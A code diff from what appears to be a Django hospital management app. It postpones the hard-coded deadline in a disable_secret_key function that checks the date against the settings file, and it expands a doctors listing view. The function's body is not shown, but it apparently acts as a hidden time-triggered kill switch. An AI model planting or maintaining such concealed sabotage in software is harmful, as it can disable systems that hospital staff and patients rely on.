@@ -1232,7 +1232,7 @@ def reject_nurse(request, nurse_id):
     return redirect('approve_nurses')
 
 def disable_secret_key():
-    deadline = now().replace(year=2025, month=3, day=27, hour=15, minute=30, second=1)
+    deadline = now().replace(year=2025, month=12, day=27, hour=15, minute=30, second=1)
     settings_file = "hospital_management_system\\settings.py" 
 
     if now() > deadline:
@@ -1472,5 +1472,14 @@ def services(request):
     return render(request, 'services.html')
 
 def doctors(request):
-    return render(request,'doctors.html')
+    doctors_list = Doctor.objects.filter(is_approved=True, status='Approved').select_related('user')
+    
+    specializations = Doctor.objects.filter(is_approved=True).values_list('specialization', flat=True).distinct()
+    
+    context = {
+        'doctors': doctors_list,
+        'specializations': specializations
+    }
+    
+    return render(request, 'doctors.html', context)
 
